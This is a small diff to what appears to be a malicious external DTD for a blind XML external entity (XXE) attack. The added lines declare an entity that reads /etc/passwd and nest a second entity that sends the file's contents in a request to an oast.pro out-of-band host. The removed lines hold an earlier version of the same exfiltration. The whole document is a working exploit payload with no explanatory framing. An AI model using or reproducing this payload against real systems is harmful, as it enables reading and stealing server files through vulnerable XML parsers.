@@ -1,2 +1,4 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://cvjbmudp0svs73ciq4igc8jqaz6d6gb1k.oast.pro/leak?data=%file;'>">
-%all;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://cvjbmudp0svs73ciq4igc8jqaz6d6gb1k.oast.pro/?x=%file;'>">
+%eval;
+%exfiltrate;
